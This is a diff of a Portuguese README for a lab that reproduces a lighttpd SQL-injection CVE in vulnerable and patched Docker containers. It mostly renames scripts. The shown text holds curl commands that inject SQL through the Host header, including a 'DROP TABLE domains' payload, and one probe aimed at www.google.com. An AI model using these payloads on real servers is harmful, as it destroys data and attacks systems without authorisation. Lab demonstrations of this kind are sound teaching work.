@@ -234,10 +234,12 @@ Como resultado temos:
 - servidor lighty escutando na porta 80 do container `lighty-vulnerable`.
 - servidor lighty escutando na porta 80 do container `lighty-patched`.
 
+![Containers](assets/docker-containers-up.png)
+
 Para obter os IPs dos containers, basta executar o comando:
 
 ```sh
-$ ./scripts/run-getips.sh
+$ ./scripts/getips.sh
 
 Docker container ip Addresses:
  - lighty-vulnerable:  172.17.0.3
@@ -323,7 +325,7 @@ Podemos então explorar tal vulnerabilidade.
 Utilizando o `curl` podemos realizar o forjar requests mal intencionados como descrito na confirmação da CVE.
 
 ```sh
-$ ./scripts/run-exploit1
+$ ./scripts/exploit1
 curl --header "Host: []' SINTAXE ERRADA" redes.io
 ```
 
@@ -332,7 +334,7 @@ curl --header "Host: []' SINTAXE ERRADA" redes.io
 Podemos detectar claramente que há uma vulnerabilidade a ser explorada uma vez que não deveria ocorrer um erro interno de servidor. Testando o mesmo script para o servidor do google:
 
 ```sh
-$ ./scripts/run-exploit2
+$ ./scripts/exploit2
 curl --header "Host: []' SINTAXE ERRADA" www.google.com
 
 <html><title>Error 400 (Bad Request)!!1</title></html>% 
@@ -350,7 +352,7 @@ Confirmamos que podemos explorar o banco de dados ao analisar o request feito ao
 Podemos prosseguir então com comandos destrutíveis!
 
 ```sh
-$ ./scripts/run-exploit3
+$ ./scripts/exploit3
 curl --header "Host: []'; DROP TABLE domains;--'" redes.io
 ```
 
@@ -372,7 +374,7 @@ Podemos verificar que o patch resolve o problema primeiramente refazendo os test
 
 ```
 ```sh
-$ ./scripts/run-exploit4
+$ ./scripts/exploit4
 
 curl --header "Host: []'; DROP TABLE domains;--'" redes.io
 ```
